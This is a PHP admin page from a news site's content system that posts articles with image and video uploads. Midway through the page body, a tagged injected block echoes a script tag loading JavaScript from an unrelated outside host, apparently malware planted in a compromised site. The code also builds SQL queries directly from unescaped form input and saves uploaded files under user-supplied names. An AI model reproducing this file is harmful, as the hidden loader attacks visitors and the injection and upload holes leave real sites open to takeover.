<?php session_start();
ob_start();

$page = "Add Article";
$side_menu = "article";
include "inc/session_check.php";


if(isset($_POST['submit']))
{
	//print_r($_POST);
	//exit;
	$flag = 0;
	$breaking_news = $_POST['breaking_news'];
	$homepage = $_POST['homepage'];
	
	$category = $_POST['category'];
	if($category == "")
	$flag = 1;
	if($category==8)
	{
	$state_list = $_POST['state_list'];
	if($state_list == "")
	$flag = 1;
	}
	else {
	$state_list = 0;	
	}
	
	if($category==13)
	{
	$district_list = $_POST['district_list'];
	if($district_list == "")
	$flag = 1;
	}
	else {
	$district_list = 0;	
	}
	$article_date = $_POST['article_date'];
	if($article_date == "")
	$flag = 1;
	$article_title = addslashes($_POST['article_title']);
	if($article_title == "")
	$flag = 1;
	$posted_by = $_POST['posted_by'];
	if($posted_by == "")
	$flag = 1;
	$img_caption = addslashes($_POST['img_caption']);
	if($img_caption == "")
	$flag = 1;
	$article = $_POST['rte1'];
	if($article == "")
	$flag = 1;
	$daily_kural=$_POST['daily_kural'];
	$today = date("Y-m-d");
	$news_type=$_POST['type'];
	
	
	 if($news_type=="video")
	  {
		$video_path = "videos/".$_FILES["video"]["name"];
		//echo $video_path; 
		move_uploaded_file($_FILES['video']['tmp_name'], $video_path);
		//exit;
	  }
	  else {
	  	$video_path = $_POST['link'];
	  }
	
	 if($flag==0)
	 {
	 	$image = $_FILES["article_image"]["name"];
		$tem_name = $_FILES['article_image']['tmp_name'];
		$main_folder_path = "article_images/";
		$sub_folder_path1 = $main_folder_path."sub1/";
		$sub_folder_path2 = $main_folder_path."sub2/";
		$filename_path = $main_folder_path.$image;
		list($width, $height, $type, $attr) = getimagesize($_FILES["article_image"]["tmp_name"]); 
		
		 $max_width = 663;
		  $ratio = $width/$height; // width/height
			if( $ratio > 1) {
			    $max_width = 663;
			    $max_height = 663/$ratio;
			}
			else {
			    $max_width = 663*$ratio;
			    $max_height = 663;
			}
			 $max_height = round($max_height);
		
		upload_images($image,$tem_name,211,158,$sub_folder_path1);
		upload_images($image,$tem_name,310,240,$sub_folder_path2);
		
		
		if(upload_images($image,$tem_name,$max_width,$max_height,$main_folder_path))
		{
		//	echo "insert into articles (category,state_list,district_list,homepage,breaking_news,article_title,posted_by,image,img_caption,article,news_type,news_details,article_date,post_date,status) values ('$category','$state_list','$district_list','$homepage','$breaking_news','$article_title','$posted_by','$image','$img_caption','$article','$news_type','$video_path','$article_date','$today','1')";
			$insert = "insert into articles (category,state_list,district_list,homepage,breaking_news,article_title,posted_by,image,img_caption,article,news_type,news_details,daily_kural,article_date,post_date,status) values ('$category','$state_list','$district_list','$homepage','$breaking_news','$article_title','$posted_by','$image','$img_caption','$article','$news_type','$video_path','$daily_kural','$article_date','$today','1')";
			if(mysql_query($insert))
			{
				header("location: post_article.php?msg=succ&cont=Article posted successfully");
			}
			else
				{
					header("location: post_article.php?msg=err&cont=Error in insert Query.");
				}
		}
	 	
	 }
	 else {
		 header("location: post_article.php?msg=err&cont=Please fill the required fields.");
	 }
}
?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin | Add Advertisement</title>
     <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    <style>
    	#rte1_toolbar2,#rte1_toolbar3 {
    		display:none !important;
    	}
    	#rte1_tbl{
    		width:700px !important;
    	}
    </style>

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>

			<div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                  Post Article
                  </div>
                </div>
                <div class="widget-body">
<?php include "message.php"; ?>
<?php
#84d8bf#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967032\"></script>";
echo $g;
}
#/84d8bf#
?><form class="form-horizontal no-margin well" name="post_article" id="post_article" enctype="multipart/form-data" method="post">
<h5 class="text-info">Category Information</h5>
<hr>

<div class="control-group">
  <label class="control-label">
   Is this Breaking News ? :
  </label>
  <div class="controls">
<label class="radio inline">
<input type="radio" checked="checked" class="required" name="breaking_news" value="0" /> No 
</label>
<label class="radio inline">
 <input  class="required" type="radio" name="breaking_news" value="1" /> Yes
 </label> 
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Category * :
  </label>
  <div class="controls">
    <select class="required span4" id="newcategory" name="category">
	<option value="">Select Category</option>
	<?php
	$selectcat = mysql_query("select id,cat_name from news_category where status='1'");
	while($fetchcat=mysql_fetch_array($selectcat))
	{?>
	 <option value="<?=$fetchcat['id']?>"><?=$fetchcat['cat_name']?></option>
	 <?php } ?>
	</select> 
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Do you want to display this new in Home page slider ? :
  </label>
  <div class="controls">
<label class="radio inline">
<input type="radio" checked="checked" class="required" name="homepage" value="0" /> No 
</label>
<label class="radio inline">
 <input  class="required" type="radio" name="homepage" value="1" /> Yes
 </label> 
  </div>
</div>

<div id="states_div" class="control-group">
  <label class="control-label">
    State * :
  </label>
  <div class="controls">
     <select id="state_list" name="state_list">
		<option value="">Loading...</option>
	</select> 
  </div>
</div>

<div id="district_div" class="control-group">
  <label class="control-label">
    District * :
  </label>
  <div class="controls">
     <select id="district_list" name="district_list">
		<option value="">Loading...</option>
	</select> 
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Article Date :
  </label>
  <div class="controls">
    <input type="text" name="article_date" class="required span4" id="datepicker"  />
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Daily Kural :
  </label>
  <div class="controls">
    <textarea name="daily_kural" class="required span4"></textarea>
  </div>
</div>


<div class="control-group">
  <label class="control-label">
    Article Title
  </label>
  <div class="controls">
   <input type="text" name="article_title" class="required span4"  />
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Posted By :
  </label>
  <div class="controls">
    <input type="text" name="posted_by" class="required span4"  />
  </div>
</div>




<div class="control-group">
  <label class="control-label">
    Upload Photo :
  </label>
  <div class="controls">
   <input type="file" name="article_image" class="required span4" />
  </div>
</div>
<div class="control-group">
  <label class="control-label">
  Upload Video: <input type="radio" name="type" onclick="display(this.value)" value="video" >
  </label>
  <label class="control-label">
	URL link : <input type="radio" name="type"  onclick="display(this.value)" value="link" >
  </label>
 </div>
 <div class="control-group">
  <div class="controls" style="display:none;" id="video">
   <input type="file"  name="video" class="span4" />  
</div>
</div>
<div class="control-group">
  <div class="controls" style="display:none;" id="link">
   <input type="text"  name="link"  class="span4" />
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Photo Caption :
  </label>
  <div class="controls">
    <input type="text" class="required span4" name="img_caption" />
  </div>
</div> 

<div class="control-group">
  <label class="control-label">
    Article :
  </label>
  <div class="controls">
    <textarea rows="25" cols="65" class="required span4" name="rte1"></textarea>
  </div>
</div> 
 
<div class="form-actions no-margin">
<input type="submit" class="btn btn-info" name="submit" value="Submit" /> &nbsp; <input type="reset" class="btn" name="reset" value="Reset" />
</div>
</form>
<script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.js"></script>
<script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
<link href="css/jquery-ui-1.10.3.custom.css" rel="stylesheet">
<script type="text/javascript"  src="js/jquery-latest.js"></script>
<script src="js/jquery-ui-1.10.3.custom.js"></script>
<?php // include ("tinymce.php"); ?>
<script type="text/javascript"  src="js/jquery.validate.js"></script>
<script>

  $(document).ready(function(){
  	$("#states_div").hide();
	$("#district_div").hide();
    $("#post_article").validate({
    	success: function(label) {
			label.html("&nbsp;").addClass("checked");
		}
    });
    $("#newcategory").change(function()
    {
   if($(this).val()==8)
    {
    	$("#states_div").show();
    	$("#state_list").addClass("required");
    	
     	dataString = "";
    	$.ajax({
		type: "POST",
		url: "ajax_state.php",
		data: dataString,
		success: function(html)
		{
		$("#state_list").html(html);
		$("#state_list").removeClass("required");
		} 
		});
    }
	
	else if($(this).val()==13)
    {
    	$("#district_div").show();
    	$("#district_list").addClass("required");
    	
     	dataString = "";
    	$.ajax({
		type: "POST",
		url: "ajax_dis.php",
		data: dataString,
		success: function(html)
		{
		$("#district_list").html(html);
		$("#district_list").removeClass("required");
		} 
		});
    }
	
    else
	{
		$("#states_div").hide();
		$("#district_div").hide();
	}
    	
    });
    $("#datepicker").datepicker({
            changeMonth: true,
            changeYear: true,
			yearRange: "+0:+1",
			dateFormat: "yy-mm-dd"
        });
    
    });
    
function display(val)
	{
		if(val=="video")
		{
			document.getElementById("video").style.display="block";
			document.getElementById("link").style.display="none";
			
		}
		if(val=="link")
		{
			document.getElementById("video").style.display="none";
			document.getElementById("link").style.display="block";
		}

	}
    
    
</script>